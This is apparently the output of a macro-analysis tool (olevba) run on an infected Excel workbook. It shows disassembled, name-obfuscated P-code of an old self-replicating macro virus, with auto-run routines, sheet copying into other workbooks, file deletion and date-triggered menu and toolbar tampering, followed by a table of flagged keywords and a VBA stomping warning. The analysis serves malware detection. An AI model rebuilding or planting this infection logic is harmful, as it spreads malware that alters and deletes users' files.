' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	LitDI2 0x0003 
' 	Mul 
' 	Add 
' 	Paren 
' 	Ne 
' 	ElseIfBlock 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #99:
' 	LitVarSpecial (False)
' 	ParamNamed savechanges 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #100:
' 	OnError hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #101:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	OnError (GoTo 0) 
' Line #103:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0009 "Auto_Exit"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #107:
' 	ExitSub 
' Line #108:
' 	Label hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #109:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #110:
' 	Resume  
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Private Function mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr As Integer))
' Line #113:
' 	Dim 
' 	VarDefn mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh (As Integer)
' Line #114:
' 	Dim 
' 	VarDefn nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm (As Integer)
' Line #115:
' 	Dim 
' 	VarDefn nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn (As String)
' Line #116:
' 	Dim 
' 	VarDefn rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr (As Double)
' Line #117:
' 	Dim 
' 	VarDefn nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm (As Double)
' Line #118:
' 	Dim 
' 	VarDefn nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh (As Double)
' Line #119:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Integer)
' Line #120:
' 	LitStr 0x0000 ""
' 	St nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' Line #121:
' 	Ld rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' 	St mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh 
' Line #122:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh 
' 	For 
' Line #123:
' 	LitDI2 0x000A 
' 	LitDI2 0x003E 
' 	Div 
' 	St rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr 
' Line #124:
' 	LitDI2 0x0024 
' 	LitDI2 0x003E 
' 	Div 
' 	St nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm 
' Line #125:
' 	ArgsCall Read 0x0000 
' Line #126:
' 	ArgsLd Rnd 0x0000 
' 	St nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' Line #127:
' 	ArgsCall Read 0x0000 
' Line #128:
' 	Ld nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' 	Ld rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr 
' 	Lt 
' 	IfBlock 
' Line #129:
' 	LitDI2 0x0039 
' 	LitDI2 0x0030 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #130:
' 	Ld nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' 	Ld nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm 
' 	Lt 
' 	ElseIfBlock 
' Line #131:
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' 	Ld nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' Line #136:
' 	StartForVariable 
' 	Next 
' Line #137:
' 	Ld nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' 	St mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 
' Line #138:
' 	EndFunc 
' Line #139:
' 	FuncDefn (Private Sub rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh())
' Line #140:
' 	Dim 
' 	VarDefn mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #141:
' 	StartForVariable 
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	EndForVariable 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ForEach 
' Line #142:
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	MemLd Caption 
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #143:
' 	StartForVariable 
' 	Next 
' Line #144:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #145:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0005 "Print"
' 	Eq 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Open"
' 	Eq 
' 	Or 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Save"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #146:
' 	StartForVariable 
' 	Next 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub Auto_Close())
' Line #149:
' 	Ld ThisWorkbook 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0008 "*EXTRAS*"
' 	Like 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ThisWorkbook 
' 	MemSt Saved 
' 	EndIf 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Private Sub hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh())
' Line #152:
' 	OnError nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn 
' Line #153:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	Concat 
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #154:
' 	Label nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn 
' Line #155:
' 	ExitSub 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Private Sub hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn())
' Line #158:
' 	Ld ActiveWorkbook 
' 	MemLd ProtectStructure 
' 	Not 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #160:
' 	Dim 
' 	VarDefn mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm (As Variant)
' Line #161:
' 	Dim 
' 	VarDefn mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn (As String)
' Line #162:
' 	Ld ActiveWorkbook 
' 	MemLd ActiveSheet 
' 	MemLd New 
' 	St mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn 
' Line #163:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' Line #164:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #165:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #166:
' 	Ld mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' 	ArgsMemCall Activate 0x0000 
' Line #167:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #168:
' 	StartWithExpr 
' 	Ld ActiveSheet 
' 	With 
' Line #169:
' 	LitDI2 0x015F 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	MemStWith New 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #171:
' 	EndWith 
' Line #172:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #173:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #174:
' 	StartWithExpr 
' 	Ld mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' 	With 
' Line #175:
' 	ArgsMemCallWith Activate 0x0000 
' Line #176:
' 	Ld mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn 
' 	ArgsMemLdWith Sheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #177:
' 	EndWith 
' Line #178:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Private Sub mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn())
' Line #182:
' 	Dim 
' 	VarDefn hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh (As String)
' Line #183:
' 	LitStr 0x0008 "Style..."
' 	St hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' Line #184:
' 	ArgsCall Read 0x0000 
' Line #185:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "AutoFormat..."
' 	St hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' 	EndIf 
' Line #186:
' 	OnError mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr 
' Line #187:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	ParamNamed Caption 
' 	Ld hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' 	ParamNamed before 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ArgsMemCall Add 0x0002 
' Line #188:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	MemSt Enabled 
' Line #189:
' 	Label mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr 
' Line #190:
' 	ExitSub 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Private Sub mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr())
' Line #193:
' 	Dim 
' 	VarDefn hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr (As Integer)
' Line #194:
' 	ArgsCall Read 0x0000 
' Line #195:
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' Line #196:
' 	Ld hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' 	LitDI2 0x0006 
' 	Le 
' 	IfBlock 
' Line #197:
' 	ArgsCall (Call) rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh 0x0000 
' Line #198:
' 	Ld hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' 	SelectCase 
' Line #199:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #200:
' 	ArgsCall (Call) rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr 0x0000 
' Line #201:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #202:
' 	ArgsCall (Call) hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm 0x0000 
' Line #203:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #204:
' 	ArgsCall (Call) hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh 0x0000 
' Line #205:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #206:
' 	ArgsCall (Call) mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn 0x0000 
' Line #207:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #208:
' 	ArgsCall (Call) nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh 0x0000 
' Line #209:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #210:
' 	ArgsCall (Call) nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn 0x0000 
' Line #211:
' 	EndSelect 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	EndSub 
' Line #214:
' 	FuncDefn (Private Sub hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm())
' Line #215:
' 	LitVarSpecial (True)
' 	LitStr 0x0008 "Auditing"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #216:
' 	EndSub 
' Line #217:
' 	FuncDefn (Sub Auto_Exit())
' Line #218:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #219:
' 	Ld ActiveWorkbook 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #220:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0008 
' 	Lt 
' 	IfBlock 
' Line #221:
' 	ArgsCall hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn 0x0000 
' Line #222:
' 	ElseBlock 
' Line #223:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0002 
' 	Pwr 
' 	LitDI2 0x000A 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Div 
' 	Add 
' 	Paren 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr 0x0000 
' 	EndIf 
' Line #224:
' 	EndIfBlock 
' Line #225:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0114 
' 	LitDI2 0x000C 
' 	Div 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Ne 
' 	ElseIfBlock 
' Line #226:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0008 
' 	Lt 
' 	IfBlock 
' Line #227:
' 	ArgsCall hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn 0x0000 
' Line #228:
' 	ElseBlock 
' Line #229:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0002 
' 	Pwr 
' 	LitDI2 0x000A 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Div 
' 	Add 
' 	Paren 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr 0x0000 
' 	EndIf 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	ElseBlock 
' Line #232:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0002 
' 	Pwr 
' 	LitDI2 0x000A 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Div 
' 	Add 
' 	Paren 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr 0x0000 
' 	EndIf 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

